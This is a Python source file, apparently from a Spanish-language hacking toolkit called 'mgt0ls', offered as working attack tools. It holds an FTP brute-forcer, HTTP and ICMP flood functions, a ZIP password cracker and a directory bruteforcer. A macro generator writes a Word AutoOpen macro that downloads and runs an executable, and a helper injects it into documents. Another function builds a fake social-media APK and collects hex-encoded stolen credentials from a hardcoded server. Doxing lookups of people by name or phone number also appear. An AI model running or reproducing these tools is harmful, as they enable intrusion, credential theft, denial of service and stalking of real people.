import os

try:
    with open(".root", "r") as root_dir:
        ROOT_MAX = root_dir.readlines()[0]

        if "\\" in ROOT_MAX:
            ROOT_MAX = ROOT_MAX.replace("\\", "/")
        
        if "//" not in f"{ROOT_MAX}/":
            ROOT_MAX = ROOT_MAX + "/" # Cuando se use ROOT_MAX no hay que usar / porque ya lo tiene incluido

except:
    if "mgt0ls" in os.getcwd():
        print("[ERROR 01] setup.py Aun no ah sido ejecutado...")
    else:
        print("[ERROR 02] No estas en la carpeta principal de mgt0ls...")
    exit(0)

import sys
import time
import shutil
import codecs
import random
import base64
import pyzipper
import platform
import requests
import aspose.words as aw
from bs4 import BeautifulSoup
from tabulate import tabulate
from ftplib import FTP, error_perm, error_reply, error_temp

def findperson(nombre, arg): # Funciona with
    nombre = f"{nombre} /{arg.upper()}"



    def limpieza(limp):

        limp=limp.replace('{"',"")
        limp=limp.replace('"}',"")
        limp=limp.replace(",", "\n")
        
        limp=limp.replace('":"',"===>")
        limp=limp.replace(" ","=")

        limp=limp.split()

        for palabra in limp:

            if len(palabra) < 80 and '>"' not in palabra and "code" not in palabra and "matches" not in palabra and "None" not in palabra and "time" not in palabra and "message" not in palabra:

                if "dv" in palabra:
                    palabra="\n[NEXT PERSON]\n"
                
                palabra=palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT")

                if "CONTENT:[]" in palabra:
                    print("[ERROR] {} NO ENCONTRADA".format(nombre).upper())
                    break
                else:
                    print(palabra)

                #print(palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT"))


    def geo():

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }


        data= {
            
            "value":"{}".format(nombre),
            "ab":"false",

            filter:{

                "personas":"true",
                "empresas":"true",
                "lugares":"true",
                "argentina":"true",
                "bolivia":"false",
                "chile":"false",
                "colombia":"false",
                "guatemala":"false",
                "mexico":"false",
                "venezuela":"false"

                }
            
            }

        buscador=requests.post("https://www.genealog.cl/Geneanexus/search", headers=headers, data=data)

        save=open("a.txt", "w")
        save.write(buscador.text)
        save.close()

        with open("a.txt", "r") as leer:

            for line in leer:

                if '{"' in line:
                    resultados=line.replace("var result = ", "")
                    #resultados_json=json.loads(resultados)

        os.remove("a.txt")

        return limpieza(resultados)


    ##### PRINCIPAL CODE

        #nombre_temp=""
    fi_update={}

    fi={
        "personas":"true",
        "empresas":"true",
        "lugares":"true",
        "argentina":"/A",
        "bolivia":"/B",
        "chile":"/C",
        "colombia":"/C",
        "guatemala":"/G",
        "mexico":"/M",
        "venezuela":"/V"
        }
    
    if "/ALL" in nombre.upper():
        todos="true"

        nombre=nombre.replace(" /ALL", "")

        for key in fi.keys():
            
            fi_update.setdefault(key,todos)
            fi.update(fi_update)
    else:

        for key in fi.keys():

            if key != "personas" and key != "empresas" and key != "lugares":

                if fi.get(key) in nombre.upper():
                    nombre_temp=nombre.replace(fi.get(key), "")

                    fi_update.setdefault(key,"true")    # DEPENDE DEL RESULTADO SE ACTUALIZA A TRUE O FALSE
                else:
                    fi_update.setdefault(key,"false")

        fi.update(fi_update)
        nombre=nombre_temp
            


    data= {
    
    "value":"{}".format(nombre),
    "ab":"false","filter":fi
    
    }

    try:
        print(geo())
    except:
        print("[ERROR] ALGO SUCEDIO")
        pass

def ftpbrute(selec, ftpserver, usuario, password): # Deberia funcionar with

    selec = selec.lower()

    def limpieza():

        if selec == "mul":

            usuarios=open(usuario)
            lec_usuarios=usuarios.read()

            if " " in lec_usuarios:
                lec_usuarios=lec_usuarios.replace(" ","\n")

            usu_save=open(".tempusu", "w")
            usu_save.write(lec_usuarios)

            usu_save.close()
            usuarios.close()

        passw=open(password)
        pass_lec=passw.read()

        if " " in pass_lec:
            pass_lec=pass_lec.replace(" ", "\n")
        
        pass_save=open(".temppass", "w")
        pass_save.write(pass_lec)

        pass_save.close()
        passw.close()

    def vector(usuario,password,ftpserver):

        try:
            with FTP(ftpserver) as conect:
                conect.login(user=usuario, passwd=password)
        #conect.login(user=usuario,passwd=password) # TimeoutError

        except TimeoutError:
            print(f"[OUT] SERVIDOR NO RESPONDE EN ->> [U]-{usuario}-[P]-{password}")
        except (error_temp, error_perm, error_reply):
            print(f"[BAD] USUARIO Y CONTRASEÑA INVALIDO ->> [U]-{usuario}-[P]-{password}")
        except:
            print("[ERR] ALGO SUCEDIO X_X")
        else:
            print(f"[GET] USUARIO Y CONTRASEÑA CORRECTOS ->> [U]-{usuario}-[P]-{password}")
            exit(0)
            

    def ataque(usuario, ftpserver):

    
        if selec == "mul": # Ataque a multiples usuarios
            with open(".temppass", "r") as  lines_pass, open(".tempusu", "r") as lines:
                for usuario in lines:
                    usuario=usuario.strip()

                    for password in lines_pass:
                        password=password.strip()
                        vector(usuario,password,ftpserver)
                    lines_pass.seek(0)

        if selec == "one": # Un solo usuario
            with open(".temppass", "r") as  lines_pass:
                for password in lines_pass:

                    password=password.strip()
                    vector(usuario,password,ftpserver)
        
        print("[ERROR] NO SE LOGRO ENCONTRAR NINGUNA COINCIDENCIA...")
                



    ######################################################################################

    #try:
    limpieza()
    print(f"[FTP] EMPEZANDO ATAQUE EN ->> {ftpserver}")
    ataque(usuario, ftpserver)

    #except:
    #exit(0)

def httpflood(URL):

    def cookie_generator():

        global headers, cookies, cookie_pre
        AZAR=random.randint(1,10)

        cookie_pre=str(random.randint(9**100,9**101)).encode("utf-8") # (9**100.65,9**101.65)
        cookie_pre=base64.b64encode(cookie_pre*BYTESEND).decode("utf-8")

        #headers={"User-Agent":"{}".format(random_agents.get(AZAR))}
        headers={
            
            "User-Agent":f"{random_agents.get(AZAR)}",
            "Referer":f"https://www.{cookie_pre*BYTESEND}.com",
            "Cookie":f"{cookie_pre*BYTESEND}",
            "Authorization":f"{cookie_pre}",
            "Origin":f"{cookie_pre*BYTESEND}",
            "Cache-Control":"no-cache"

            }

        cookies={
            
            "{}".format(cookie_names.get(AZAR)):f"{cookie_pre}"

            }


    random_agents={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }

    cookie_names={

        1:"PHPSESSID",
        2:"JSESSIONID",
        3:"ga",
        4:"_gid",
        5:"_gat",
        6:"__cfduid",
        7:"__utmz",
        8:"cookieconsent_status",
        9:"csrftoken",
        10:"session-id"

    }

    BYTESEND=1
    status_max=200


    while True:

        try:
            while status_max == 200:
                cookie_generator()
                test=requests.get(URL, headers=headers, cookies=cookies) # UTILIZA POST SI ES VUL
                status_max=test.status_code
                print("[FIND] BUSCANDO PESO DE PAYLOAD ->> [{}] STATUS [{}]".format(BYTESEND,status_max))
                
                if status_max != 200:
                    BYTESEND=BYTESEND-1
                    proceso=cookie_pre*BYTESEND

                    proceso=sys.getsizeof(proceso)

                    terminal=1048576/proceso

                    print(f"[SET] PAYLOAD SIZE {round(proceso/1024,2)}KB ->> [200]\n[SET] EN {round(terminal)} SOLICITUDES HAY ->> 1MB")
                    time.sleep(5)
                else:
                    BYTESEND=BYTESEND+1

        except:
            print("[ERROR] NOS HAN TIRADO X_X")
            exit(0)
        try:
            cookie_generator()
            atak=requests.get(URL, headers=headers, data=headers, cookies=cookies) # UTILIZA POST SI ES VUL
        except:
            print("[ERROR] NOS HAN TIRADO X_X")
            exit(0)
        else:

            if atak.status_code != 200:
                print("[SERVER OUT] URL ->> {} STATUS CODE ATACK ->> [{}]".format(URL, atak.status_code))
            else:
                print("[ATACANDO] URL ->> {} STATUS CODE ATACK ->> [{}]".format(URL, atak.status_code))

def icmpdos(ip, pack):

    pack = int(pack)

    SYS=platform.system().lower()
                
    print("ATACANDO => {} CON {}".format(ip,pack))

    if SYS == "windows":
        os.system("ping -l {} -t {}".format(pack,ip))
    else:
        os.system("ping -s {} {}".format(pack,ip))

def iplocate(ip):

    def limpieza(limp):

        limp=limp.replace('": {'," [BLOCK]\n")
        limp=limp.replace("{","")
        limp=limp.replace(",","")
        limp=limp.replace('"',"")
        limp=limp.replace("}","\n")
        limp=limp.replace("  ","")
        limp=limp.replace(":","->>")
        
        return limp.upper()

    headers={

        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",

    }

    try:
        localizando=requests.get(f"https://ipinfo.io/widget/demo/{ip}", headers=headers)
    except:
        print(f"[ERROR] NO INTERNET OR BAD IP ->> {ip}")
        pass
    else:
        print(limpieza(localizando.text))

def lopiapi(numero):

    def legible(json):
        
        
        if "," in json or "}" in json:
            
            
            json=json.replace("{","")
            json=json.replace("}","")
            json=json.replace(",","\n\n")
            json=json.replace('"','')
            json=json.replace("[", "")
            json=json.replace("]", "")
            json=json.upper()
            
            return json
            
        else:
            return "\n[ERROR] Numero no encontrado...\n"

    try:
        consulta=requests.get("https://api-lipiapp.lipigas.cl/wapi/no_auth/usuarios/terminos/{}".format(numero))
        
        consulta_n=requests.get("https://api-lipiapp.lipigas.cl/wapi/clientes?telefono={}&pais=cl&segmento=1".format(numero))
                            
        print("\n"+legible(consulta.text)+"\n"+legible(consulta_n.text)+"\n")
    
    except:
        print("\n[ERROR] NO CONECTION 404\n")

def macromaker():

    def down():

        lec=macro_in_cache.replace("url_mgtols", rem)
        lec=lec.replace("archivo_mgtols", rem_2)

        escribe=open("macro.vb","w")
        escribe.write(lec)
        escribe.close()

        return "[MACRO] ===> MACRO.VB" 

        
    macro_in_cache="""
Sub AutoOpen()
    Dim url As String
    Dim destino As String
    Dim objShell As Object
    
    ' URL del archivo a descargar
    url = "url_mgtols"
    
    ' Ruta donde guardar el archivo (temporal en este caso)
    destino = Environ("TEMP") & "\\archivo_mgtols"
    
    ' Crear objeto Shell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Descargar archivo
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.send
    
    ' Guardar archivo y ejecutarlo si se descargo correctamente
    If http.Status = 200 Then
        Open destino For Binary As #1
        Put #1, , http.responseBody
        Close #1
        objShell.Run destino
        Set objShell = Nothing
    Else
        Set objShell = Nothing
    End If
    
End Sub
    """


    try:
        
        selec=int(input("[01] Descargar Malware [02] Ejecutar Shell Commands ==> macr0mak3r>>"))

        while selec <= 0 or selec > 3:
            selec=int(input("[01] Descargar Malware [02] Ejecutar Shell Commands ==> macr0mak3r>>"))

    except:
        pass

    else:

        if selec == 1:

            try:
                rem=input("Introduce el enlace de tu archivo a descargar [URL/ARCHIVO.EXE]: ")
                
                while len(rem) == 0:
                    rem=input("Introduce el enlace de tu archivo a descargar [URL/ARCHIVO.EXE]: ")

                rem_2=input("Introduce el nombre de archivo [ARCHIVO.EXE]: ")

                while len(rem_2) == 0:
                    rem_2=input("Introduce el nombre de archivo [ARCHIVO.EXE]: ")


            except:
                pass
            else:
                try:
                    print(down())
                except:
                    print("[ERROR] ALGO SALIO MAL")
                    pass
        
        if selec == 2:
            print("[OPTION] EN DESARROLLO")

def seeker(usuario): # Funciona with

    try:

        down_url = requests.get("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/url_dox.txt")

        with open(".bdd", "w", encoding="utf-8") as save_dw:
            save_dw.write(down_url.text)

    except:
        
        print("[ERROR] No tienes conexion a internet...")
        exit(0)
    

    status_codes = {

        200: "Posible Coincidencia",
        201: "Creado",
        202: "Aceptado",
        203: "Información no autorizada",
        204: "Sin contenido",
        205: "Restablecer contenido",
        206: "Contenido parcial",
        207: "Multi-estado",
        208: "Ya reportado",
        226: "IM utilizado",
        400: "Solicitud incorrecta",
        401: "No autorizado",
        402: "Pago requerido",
        403: "Prohibido",
        404: "No encontrado",
        405: "Método no permitido",
        406: "No aceptable",
        407: "Se requiere autenticación de proxy",
        408: "Tiempo de espera agotado",
        409: "Conflicto",
        410: "Gone (El recurso ya no está disponible y no lo estará nuevamente)",
        411: "Longitud requerida",
        412: "Precondición fallida",
        413: "Carga útil demasiado grande",
        414: "URI demasiado larga",
        415: "Tipo de medio no soportado",
        416: "Rango no satisfactorio",
        417: "Expectativa fallida",
        418: "Soy una tetera (código de estado de broma)",
        421: "Solicitud mal dirigida",
        422: "Entidad no procesable",
        423: "Bloqueado",
        424: "Dependencia fallida",
        425: "Demasiado pronto",
        426: "Se requiere actualización",
        428: "Requisito previo necesario",
        429: "Demasiadas solicitudes",
        431: "Campos de encabezado de solicitud demasiado grandes",
        451: "No disponible por razones legales",
        500: "Error interno del servidor",
        501: "No implementado",
        502: "Puerta de enlace incorrecta",
        503: "Servicio no disponible",
        504: "Tiempo de espera de la puerta de enlace agotado",
        505: "Versión HTTP no soportada",
        506: "La variante también negocia",
        507: "Almacenamiento insuficiente",
        508: "Bucle detectado",
        510: "No extendido",
        511: "Se requiere autenticación de red"

    }

    random_usera={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }

    headers= { # Especifica los valores necesarios para que get funcione correctamente
        
        "User-Agent": "{}".format(random_usera.get(random.randint(1,10))),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Expires': '0'
        
    }

    def buscador(usuario):

        while True:
            
            print("[Tipo de busqueda] ===> [URL] A [{}]\n[Buscando en 800 <sitios>]".format(usuario))
            
            #leer=open(".bdd")
            #lectura=leer.readlines()

            #save=open("capture.txt", "w")

            with open(".bdd", "r") as lectura, open("capture.txt", "w") as save:
                
                for word in lectura:
                    
                    if "\n" in word:
                        word=word.replace("\n","")
                    
                    try:
                        word=word.replace("name_find", usuario) # Reemplaza el name_find del diccionario por el usuario
                        soli=requests.get(word, timeout=20)           
                        
                        if soli.status_code == 200 or "xbox" in word:
                            save.write("\n[URL] "+word)
                        #a=soli.status_code
                        
                        print("[URL] {}\n[{}]".format(word,status_codes.get(soli.status_code)))

                    except KeyboardInterrupt:
                        save.close()
                        exit(0)

                    except:
                        pass
                    
            # Bloque de finalizacion
            print("\nSiguiente busqueda: [IN WEB]->>60 sec")

            time.sleep(60)
            siguiente()
            break

    def siguiente():
        print("[Tipo de busqueda] ===> [IN WEB] A [{}]\n".format(usuario))

        head_up={
            "User-Agent": "{}".format(random_usera.get(random.randint(1,10)))
            }
        
        headers.update(head_up)

        red=[]
        base="https://www.bing.com"
        busca= '/search?q="{}"'.format(usuario)

        try:
            dox=requests.get(base+busca, headers=headers)
            time.sleep(2)

        except:
            pass

        else:

            #save=open("capture.txt", "a")
            with open("capture.txt", "a") as save:

                sopa=BeautifulSoup(dox.text, "html.parser") # Obtengo la web en etiquetas
                
                for word in sopa.find_all("a"): # Busco parametros <a en sopa

                    palabra=str(word.get("href")) # Obtengo la etiqueta especifica href

                    if "https://" in palabra:
                        print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
                        save.write("\n[URL] {}".format(palabra))
                    
                    if "first=" in palabra:
                        red.append(palabra)
                
                for word in red:

                    try:
                        dox=requests.get(base+word, headers=headers)
                        time.sleep(2) # SI SE DESCOMENTA, NO SE ALCANZA A LEER COMPLETA LA PAGINA /ALL time.sleep
                    except:
                        pass
                    
                    else:
                        sopa=BeautifulSoup(dox.text, "html.parser")
                        
                        for word_soup in sopa.find_all("a"):

                            palabra=str(word_soup.get("href"))

                            if "https://" in palabra:
                                print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
                                save.write("\n[URL] {}".format(palabra)) ##########################

            print("\nDatos de {} guardados en capture.txt!!".format(usuario))
            exit(0)

    buscador(usuario)

def tempmail(correo, selec):

    MAIL="https://mailnesia.com/mailbox/"
    mail_complemento="https://mailnesia.com"


    def limpieza(limp):
        
        limp=limp.replace("\n\n","\n")
        limp=limp.replace("\n\n\n\n\n\n","\n")
        limp=limp.replace("\n\n","\n")

        temp=open(".temp", "w", encoding="utf-8")
        temp.write(limp)
        temp.close()

        temp=open(".temp", encoding="utf-8")
        lectura=temp.readlines()

        temp_2=open(".temp_2", "w", encoding="utf-8")
        for line in lectura:

            if "https://" in line or "·" in line or "на русском языке" in line:
                ok=False
            else:
                temp_2.write(line)
        
        temp_2.close()
        temp.close()

        limp=open(".temp_2", encoding="utf-8")
        limp=limp.read()

        return limp


    try:
        solicitud=requests.get(MAIL+correo)
    
    except:
        pass

    else:
        push=0
        check=[]
        check_final={}
        check_str=None

        sopa=BeautifulSoup(solicitud.text, "html.parser")

        for link in sopa.find_all("a"):

            bandeja=str(link.get("href"))
            
            if correo+"/" in bandeja:
                check.append(bandeja)
        try:
            for link in check:

                if link != check_str:

                    push+=1
                    check_str=link
                    check_final.setdefault(push,mail_complemento+link)
        except:
            pass
        else:
            print("[EMAIL] {}@mailnesia.com ===> [LISTO PARA USAR] ===> [PUSH] Mensajes: [{}]".format(correo, push))

            if push > 0 and selec != None:
                
                selec = int(selec)

                get_mensaje=requests.get(check_final.get(selec))
                sopa=BeautifulSoup(get_mensaje.text, "html.parser")

                print(limpieza(sopa.get_text()))
                print("[ALTERNATIVA] ===> {}".format(check_final.get(selec)))             

def unzipper(dic, directiorio_archivo): # Funciona with

    def limpieza():

        limp=open(dic)
        esp=limp.read()

        abrir=open(".bbd", "w")

        if " " in esp:

            esp=esp.replace(" ","\n")

        
        abrir.write(esp)
        
        abrir.close()
        limp.close()

    def crack():
        with open(".bbd", "r") as linea: 
            with pyzipper.AESZipFile(directiorio_archivo, "r") as filesx:  # Cambiamos a AESZipFile para soportar cifrado avanzado
                for password in linea:
                    password = password.strip()  # Limpia espacios y saltos de línea
                    
                    try:
                        # Intenta extraer usando la contraseña
                        filesx.extractall("unzipper/", pwd=password.encode("utf-8"))
                        print(f"[SUCCESS] Contraseña encontrada: {password}")
                        #exit(0)  # Sale de la función si la contraseña es correcta
                    except:
                        print(f"[FAIL] Contraseña incorrecta: {password}")

    try:
        limpieza()
    except:
        print("\n[ERROR] Diccionario no existente!!")
        pass
    
    try:
        crack()
    except NotImplementedError:
        print("[ERROR] Formato de compresion no soportado!!")
    except FileNotFoundError:
        print("[ERROR] Archivo dañado o no existente!!")
    except:
        pass

def webdumper(select, url, dic_path): # Funciona with

    select = select.lower()

    random_usera={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }


    getted = []
    extensiones_comunes = [".php", ".html", ".asp", ".aspx", ".jsp", ".cgi", ".pl"]

    def get_dic(enlace, nombre):

        try:

            dic_down = requests.get(enlace)

            archivo_dic = open(nombre, "w")
            archivo_dic.write(dic_down.text)
            archivo_dic.close()

        except:
            print("[ERROR] No tienes conexion a internet...")

    def inicial_find(url, dic_path):

        #dict = open(dic_path, "r")
        #dict_line = dict.readlines()
        
        if f"/test_script" not in f"{url}test_script": # Chekea si tiene una / al final para los directorios
            url = url + "/"

        with open(dic_path, "r") as dict_line:

            for palabra in dict_line:

                palabra = palabra.replace("\n", "")
                url_100 = f"{url}{palabra}"

                if "//" in url_100:
                    url_100 = url_100.replace("//", "/")
                    url_100 = url_100.replace(":/", "://")
                
                headers = { # Especifica los valores necesarios para que get funcione correctamente
                    
                    "User-Agent": "{}".format(random_usera.get(random.randint(1,10))),
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Expires': '0'
                    
                }

                finder = requests.get(url_100, headers=headers, timeout=8)

                if finder.status_code == 200 or finder.status_code == 403:

                    if finder.status_code == 403:
                        sig = "PROTEGIDO"
                    elif finder.status_code == 200:
                        sig = "ENCONTRADO"

                    if url_100 != url and [url_100, finder.status_code, sig] not in getted:
                        getted.append([url_100, finder.status_code, sig]) # Se agrega a la variable si se encuentra algo funcional

                print(f"[URL] {url_100} ->> {finder.status_code}")

    def recursive_find(dic_path, tipo):

        if getted != []:

            if tipo == "path":
                for url in getted:
                    if not any(ext in url[0] for ext in extensiones_comunes):
                        print(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
                        inicial_find(url[0], dic_path)
            
            elif tipo == "arch":
                for url in getted:
                    if not any(ext in url[0] for ext in extensiones_comunes):
                        print(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
                        inicial_find(url[0], dic_path)


    try:

        get_dic("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/path.txt", "path.txt")
        get_dic("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/arch.txt", "arch.txt")

        if select == "f":
            if dic_path == None:
                dic_path = "path.txt" # Ubicacion del script base
            inicial_find(url, dic_path) # Obtiene los directorios ocultos
        elif select == "s": 
            inicial_find(url, "path.txt") # Obtiene los enlaces disponibles 

            recursive_find("path.txt", "path") # Luego intenta con los sub enlaces de esos mismos
            recursive_find("arch.txt", "arch")

        print("\n")
        
        if getted != []:
            print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
        else:
            print("[ERROR] No se han encontrado directorios ocultos...")
            
    except KeyboardInterrupt:
        print("\n")
        print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
    except ValueError:
        print("[ERROR] Caracter no valido...")

def wordinfect(ruta, macro):

    def integracion():

        # Load Word document.
        doc = aw.Document(ruta)
        leer=open(macro)

        # Create VBA project
        project = aw.vba.VbaProject()
        project.name = "MacroProject"
        doc.vba_project = project

        # Create a new module and specify a macro source code.
        module = aw.vba.VbaModule()
        module.name = "MacroModule"
        module.type = aw.vba.VbaModuleType.PROCEDURAL_MODULE
        module.source_code = leer.read()

        # Add module to the VBA project.
        doc.vba_project.modules.add(module)

        # Save document.
        doc.save(ruta_save)

        try:
            ruta_save=ruta.replace(".docm","_2.docm")
            integracion()
        except:
            pass
        else:
            print("[WORD INFECTADO] ===> {}".format(ruta_save))

def sc4pk(idcap, selec):

    selec = selec.lower()
    CONTADOR=0
    SYS=platform.system().lower()

    ver_carpeta=os.listdir(".scripts/sc4pk/")

    base_apk={

        "ig":"instagram",
        "fb":"facebook",
        "tw":"twitter",
        "go":"google"

    }

    def crear(selec, idcap):

        REMP=base_apk.get(selec)

        try:
            
            asset_save=open(f".scripts/sc4pk/Scam_2/assets/selec.rdp", "w")
            asset_save.write(REMP)
            asset_save.close()

            asset_save=open(f".scripts/sc4pk/Scam_2/assets/id.rdp", "w")
            asset_save.write(idcap)
            asset_save.close()

            """
            xml_open=codecs.open(".xml", "r", encoding="utf-8")
            xml_read=xml_open.read()
            xml_read=xml_read.replace("ID_MG", idcap).replace("SELEC_MG", REMP)
            xml_open.close()

            xml_open=open("main.xml", "wb", encoding="utf-8")
            xml_open.write(xml_read)
            xml_open.close() # Solucionar error de encode
            """
            # Movimiento de archivos
            #shutil.rmtree("Scam_2/res/layout/main.xml")
            #shutil.rmtree("Scam_2/res/drawable-xhdpi-v4/app_icon.png")

            shutil.move(f".scripts/sc4pk/Scam_2/res/drawable-xhdpi-v4/{REMP}.png", ".scripts/sc4pk/Scam_2/res/drawable-xhdpi-v4/app_icon.png")

            if "win" in SYS:
                print(f"[APK] COMPRIME LA APK QUE SE ECNUENTRA EN:\n[PATH] {ROOT_MAX}.scripts/sc4pk/ ->> Scam_2/")
            else:
                os.chdir(".scripts/sc4pk/Scam_2/")
                os.system("zip -r Lite.apk *")
                print(f"[APK] APK SIN FIRMA CREADA CON EXITO:\n[PATH] {ROOT_MAX}.scripts/sc4pk/Scam_2/ ->> Lite.apk")

            #shutil.move("main.xml", "Scam_2/res/layout/main.xml") 

        except:
            print("[ERROR] ALGO SUCEDIO X_X")
            pass
        
        else:
            #print()
            print("[CHECK] ->> LISTO")
            exit(0)

    def obtener(idcap):

        global CONTADOR

        try:
            obtiene=requests.get("http://192.71.249.244:60001/comments")
        except:
            print("[ERROR] ALGO SUCEDIO X_X")
            pass
        else:

            sopa=BeautifulSoup(obtiene.text, "html.parser")

            obtener=str(sopa.find_all(id="comments"))
            obtener=obtener.replace("<br/>", "\n")

            temp=open(".temp", "w", encoding="utf-8")
            temp.write(obtener)
            temp.close()

            temp=open(".temp", encoding="utf-8")
            temp_read=temp.readlines()

            chek=False

            for word in temp_read:
                word=word.replace("\n","")

                if idcap in word:
                    CONTADOR=CONTADOR+1
                    #print(word) DEVOLPING COMMENTS
                    chek=True

                    #print("\n[TARGET]->> SCAM.APK\n")
                    word=word.replace(idcap,"").replace(" ","").replace("</div>]","")
                    #print(word)
                    try:
                        print(f"[HEX] YOUR HEX CODE TARGET->> [{CONTADOR}]")
                        word=str(codecs.decode(word,"hex"))
                        print(word.replace("\\n","\n").replace("b'","[TARGET]->> SCAM.APK ->> ").replace("#'","\n").replace("%40","@").replace("%C3%B1","ñ"))
                    except:
                        print("[ERROR] HEX NO ENCONTRADO X_X")
                        exit(0)

